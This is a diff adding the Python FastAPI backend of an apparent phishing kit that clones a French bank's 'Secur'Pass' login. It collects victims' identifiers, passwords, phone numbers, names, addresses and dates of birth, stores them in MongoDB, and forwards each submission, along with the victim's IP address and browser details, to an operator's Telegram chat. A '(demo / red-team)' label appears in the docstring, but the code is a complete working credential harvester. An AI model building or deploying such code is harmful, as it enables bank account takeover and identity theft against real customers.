@@ -1,0 +1,372 @@
+"""SG clone — backend API.
+
+Stores tracking events for the (demo / red-team) verification flow into
+MongoDB and pushes Telegram notifications grouped in two blocks per session:
+  1) Session block (IP, UA, timestamp) — sent once on session start.
+  2) Data block — single message edited in-place as new data comes in
+     (identifier, password, phone, name, address, city, DOB...).
+"""
+from __future__ import annotations
+
+import logging
+import os
+import uuid
+from datetime import datetime
+from pathlib import Path
+from typing import Any, Optional
+
+import httpx
+from dotenv import load_dotenv
+from fastapi import APIRouter, FastAPI, Request
+from motor.motor_asyncio import AsyncIOMotorClient
+from pydantic import BaseModel
+from starlette.middleware.cors import CORSMiddleware
+
+ROOT_DIR = Path(__file__).parent
+load_dotenv(ROOT_DIR / ".env", override=False)
+
+# ---------------------------------------------------------------------------
+# Configuration — toutes les valeurs sont lues depuis l'environnement / .env.
+# Le fichier backend/.env est livré avec le code pour la portabilité.
+# ---------------------------------------------------------------------------
+DEFAULT_MONGO_URL = "mongodb://localhost:27017"
+DEFAULT_DB_NAME = "sg_clone"
+
+# ---------------------------------------------------------------------------
+# Mongo connection
+# ---------------------------------------------------------------------------
+mongo_url = os.environ.get("MONGO_URL") or DEFAULT_MONGO_URL
+client = AsyncIOMotorClient(mongo_url)
+db = client[os.environ.get("DB_NAME") or DEFAULT_DB_NAME]
+events_col = db["sg_events"]
+sessions_col = db["sg_sessions"]
+
+# ---------------------------------------------------------------------------
+# Telegram helpers (token + chat id viennent uniquement de backend/.env)
+# ---------------------------------------------------------------------------
+TG_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+TG_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
+
+logger = logging.getLogger("sg")
+logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(name)s | %(levelname)s | %(message)s")
+
+
+async def tg_send(text: str) -> Optional[int]:
+    """Send a Telegram message and return its message_id (or None on failure)."""
+    if not TG_TOKEN or not TG_CHAT_ID:
+        return None
+    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TG_CHAT_ID,
+        "text": text,
+        "parse_mode": "HTML",
+        "disable_web_page_preview": True,
+    }
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as cli:
+            r = await cli.post(url, json=payload)
+            if r.status_code == 200:
+                data = r.json()
+                return int(data["result"]["message_id"])
+            logger.error("Telegram sendMessage %s — %s", r.status_code, r.text[:300])
+    except Exception as exc:  # pragma: no cover
+        logger.error("Telegram send exception: %s", exc)
+    return None
+
+
+async def tg_edit(message_id: int, text: str) -> bool:
+    """Edit an existing Telegram message. Returns True on success."""
+    if not TG_TOKEN or not TG_CHAT_ID:
+        return False
+    url = f"https://api.telegram.org/bot{TG_TOKEN}/editMessageText"
+    payload = {
+        "chat_id": TG_CHAT_ID,
+        "message_id": message_id,
+        "text": text,
+        "parse_mode": "HTML",
+        "disable_web_page_preview": True,
+    }
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as cli:
+            r = await cli.post(url, json=payload)
+            if r.status_code == 200:
+                return True
+            # 400 "message is not modified" is normal, treat as success
+            if r.status_code == 400 and "not modified" in r.text:
+                return True
+            logger.error("Telegram editMessageText %s — %s", r.status_code, r.text[:300])
+    except Exception as exc:  # pragma: no cover
+        logger.error("Telegram edit exception: %s", exc)
+    return False
+
+
+def client_ip(request: Request) -> str:
+    fwd = request.headers.get("x-forwarded-for")
+    if fwd:
+        return fwd.split(",")[0].strip()
+    if request.client:
+        return request.client.host
+    return "unknown"
+
+
+def fr_dt(dt: datetime) -> str:
+    return dt.strftime("%d/%m/%Y %H:%M:%S UTC")
+
+
+# ---------------------------------------------------------------------------
+# FastAPI app + router
+# ---------------------------------------------------------------------------
+app = FastAPI(title="SG Clone API")
+api = APIRouter(prefix="/api")
+
+
+# ---------------------------------------------------------------------------
+# Models
+# ---------------------------------------------------------------------------
+class SessionStart(BaseModel):
+    page: Optional[str] = None
+
+
+class IdentifierIn(BaseModel):
+    session_id: str
+    identifier: str
+    remember: bool = False
+
+
+class PasswordIn(BaseModel):
+    session_id: str
+    password: str
+
+
+class PhoneIn(BaseModel):
+    session_id: str
+    phone: str
+    country_code: str = "+33"
+
+
+class InfoIn(BaseModel):
+    session_id: str
+    last_name: str
+    first_name: str
+    address: str
+    postal_code: str
+    city: str
+    date_of_birth: str
+
+
+class CompleteIn(BaseModel):
+    session_id: str
+
+
+# ---------------------------------------------------------------------------
+# Persistence + Telegram block updates
+# ---------------------------------------------------------------------------
+async def record_event(kind: str, request: Request, payload: dict[str, Any]) -> None:
+    doc = {
+        "_id": str(uuid.uuid4()),
+        "kind": kind,
+        "session_id": payload.get("session_id"),
+        "data": {k: v for k, v in payload.items() if k != "session_id"},
+        "ip": client_ip(request),
+        "user_agent": request.headers.get("user-agent", "")[:512],
+        "referer": request.headers.get("referer", ""),
+        "ts": datetime.utcnow(),
+    }
+    await events_col.insert_one(doc)
+    await sessions_col.update_one(
+        {"_id": payload.get("session_id")},
+        {
+            "$set": {"updated_at": datetime.utcnow(), f"last_{kind}_at": datetime.utcnow()},
+            "$addToSet": {"kinds": kind},
+        },
+    )
+
+
+async def build_data_block(session_id: str) -> str:
+    """Render the cumulative data block for a session, formatted with sections."""
+    cursor = events_col.find({"session_id": session_id}).sort("ts", 1)
+    docs = await cursor.to_list(length=200)
+
+    identifier = ""
+    remember = False
+    password = ""
+    phone = ""
+    phone_cc = "+33"
+    last_name = ""
+    first_name = ""
+    address = ""
+    postal = ""
+    city = ""
+    dob = ""
+    submitted_at: Optional[datetime] = None
+
+    for d in docs:
+        data = d.get("data", {}) or {}
+        if d["kind"] == "identifier":
+            identifier = str(data.get("identifier", ""))
+            remember = bool(data.get("remember"))
+        elif d["kind"] == "password":
+            password = str(data.get("password", ""))
+        elif d["kind"] == "phone":
+            phone = str(data.get("phone", ""))
+            phone_cc = str(data.get("country_code", "+33"))
+        elif d["kind"] == "info":
+            last_name = str(data.get("last_name", ""))
+            first_name = str(data.get("first_name", ""))
+            address = str(data.get("address", ""))
+            postal = str(data.get("postal_code", ""))
+            city = str(data.get("city", ""))
+            dob = str(data.get("date_of_birth", ""))
+        elif d["kind"] == "complete":
+            submitted_at = d.get("ts")
+
+    is_complete = submitted_at is not None
+
+    lines: list[str] = []
+    lines.append("🔓 <b>Nouvelle soumission Secur'Pass RED</b>")
+    lines.append("")
+    if identifier:
+        lines.append(f"📋 <b>Identifiant</b>: {identifier}")
+    if password:
+        lines.append(f"🔑 <b>Mot de passe</b>: {password}")
+    if any([last_name, first_name, dob, postal, city, address, phone]):
+        lines.append("")
+        lines.append("👤 <b>Informations personnelles</b>:")
+        if last_name:
+            lines.append(f"   • <b>Nom</b>: {last_name}")
+        if first_name:
+            lines.append(f"   • <b>Prénom</b>: {first_name}")
+        if dob:
+            lines.append(f"   • <b>Date de naissance</b>: {dob}")
+        if address:
+            lines.append(f"   • <b>Adresse</b>: {address}")
+        if postal:
+            lines.append(f"   • <b>Code postal</b>: {postal}")
+        if city:
+            lines.append(f"   • <b>Ville</b>: {city}")
+        if phone:
+            lines.append(f"   • <b>Téléphone</b>: {phone_cc} {phone}")
+        if identifier and remember:
+            lines.append(f"   • <b>Se souvenir</b>: oui")
+
+    when = submitted_at or datetime.utcnow()
+    lines.append("")
+    label = "Date de soumission" if is_complete else "Dernière mise à jour"
+    lines.append(f"⏰ <b>{label}</b>: {fr_dt(when)}")
+
+    return "\n".join(lines)
+
+
+def render_session_block(sess: dict[str, Any]) -> str:
+    created = sess.get("created_at") or datetime.utcnow()
+    return (
+        "🌐 <b>Nouvelle session</b>\n"
+        f"🆔 <b>Session</b>: <code>{sess['_id']}</code>\n"
+        f"📡 <b>IP</b>: {sess.get('ip', 'unknown')}\n"
+        f"🖥️ <b>User-Agent</b>: {(sess.get('user_agent') or '')[:180]}\n"
+        f"🔗 <b>Référent</b>: {sess.get('referer') or '-'}\n"
+        f"📄 <b>Page d'entrée</b>: {sess.get('page', '/')}\n"
+        f"⏰ <b>Ouverte le</b>: {fr_dt(created)}"
+    )
+
+
+async def push_data_block(session_id: str) -> None:
+    """Send the data block (first call) or edit the existing one."""
+    sess = await sessions_col.find_one({"_id": session_id})
+    if not sess:
+        return
+    text = await build_data_block(session_id)
+    data_msg_id = sess.get("tg_data_message_id")
+    if data_msg_id:
+        ok = await tg_edit(int(data_msg_id), text)
+        if ok:
+            return
+        # If edit failed, fall through and create a new message
+    new_id = await tg_send(text)
+    if new_id:
+        await sessions_col.update_one(
+            {"_id": session_id},
+            {"$set": {"tg_data_message_id": new_id}},
+        )
+
+
+# ---------------------------------------------------------------------------
+# Routes
+# ---------------------------------------------------------------------------
+@api.get("/")
+async def root() -> dict[str, str]:
+    return {"status": "ok", "service": "sg-clone"}
+
+
+@api.post("/track/session")
+async def start_session(payload: SessionStart, request: Request) -> dict[str, str]:
+    sid = str(uuid.uuid4())
+    doc = {
+        "_id": sid,
+        "ip": client_ip(request),
+        "user_agent": request.headers.get("user-agent", "")[:512],
+        "referer": request.headers.get("referer", ""),
+        "page": payload.page or "/",
+        "created_at": datetime.utcnow(),
+        "updated_at": datetime.utcnow(),
+        "kinds": ["session_start"],
+    }
+    await sessions_col.insert_one(doc)
+
+    # Block #1 — session info
+    msg_id = await tg_send(render_session_block(doc))
+    if msg_id:
+        await sessions_col.update_one({"_id": sid}, {"$set": {"tg_session_message_id": msg_id}})
+
+    return {"session_id": sid}
+
+
+@api.post("/track/identifier")
+async def track_identifier(payload: IdentifierIn, request: Request) -> dict[str, str]:
+    await record_event("identifier", request, payload.model_dump())
+    await push_data_block(payload.session_id)
+    return {"status": "ok"}
+
+
+@api.post("/track/password")
+async def track_password(payload: PasswordIn, request: Request) -> dict[str, str]:
+    await record_event("password", request, payload.model_dump())
+    await push_data_block(payload.session_id)
+    return {"status": "ok"}
+
+
+@api.post("/track/phone")
+async def track_phone(payload: PhoneIn, request: Request) -> dict[str, str]:
+    await record_event("phone", request, payload.model_dump())
+    await push_data_block(payload.session_id)
+    return {"status": "ok"}
+
+
+@api.post("/track/info")
+async def track_info(payload: InfoIn, request: Request) -> dict[str, str]:
+    await record_event("info", request, payload.model_dump())
+    await push_data_block(payload.session_id)
+    return {"status": "ok"}
+
+
+@api.post("/track/complete")
+async def track_complete(payload: CompleteIn, request: Request) -> dict[str, str]:
+    await record_event("complete", request, payload.model_dump())
+    await push_data_block(payload.session_id)
+    return {"status": "ok"}
+
+
+# ---------------------------------------------------------------------------
+app.include_router(api)
+app.add_middleware(
+    CORSMiddleware,
+    allow_credentials=True,
+    allow_origins=["*"],
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+
+@app.on_event("shutdown")
+async def shutdown_db_client() -> None:
+    client.close()
